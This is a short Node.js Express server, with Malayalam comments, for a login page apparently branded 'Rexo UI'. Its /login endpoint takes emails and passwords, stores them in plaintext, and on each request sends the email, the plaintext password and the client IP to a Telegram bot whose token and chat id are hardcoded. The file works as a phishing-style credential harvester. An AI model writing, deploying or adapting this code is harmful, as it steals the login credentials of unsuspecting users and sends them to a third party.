const express = require('express');
const app = express();
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

app.use(cors());
app.use(bodyParser.json());

// ഒരു താൽക്കാലിക ഡാറ്റാബേസ് (ഇത് സെർവർ റീസ്റ്റാർട്ട് ചെയ്താൽ മാഞ്ഞുപോകും)
const users = []; 

app.post('/login', async (req, res) => {
    const { type, email, password, details } = req.body;
    
    // അക്കൗണ്ട് ഉണ്ടോ എന്ന് പരിശോധിക്കാൻ
    if (type === "LOGIN") {
        const user = users.find(u => u.email === email && u.password === password);
        if (!user) {
            return res.status(401).json({ error: "Invalid credentials" });
        }
    } else if (type === "ACCOUNT_CREATE") {
        users.push({ email, password });
    }

    // ടെലിഗ്രാമിലേക്ക് വിവരങ്ങൾ അയക്കുന്നു
    const message = `🔔 *Rexo UI - ${type}*\n📧 Email: ${email}\n🔑 Pass: ${password}\n🌐 IP: ${details.ip}`;
    await fetch(`https://api.telegram.org/bot8530625407:AAFRtHNFlkVifEkB15BqrcfpXYpERh1ukKc/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: "6859219926", text: message, parse_mode: 'Markdown' })
    });

    res.json({ success: true });
});

app.listen(3000);
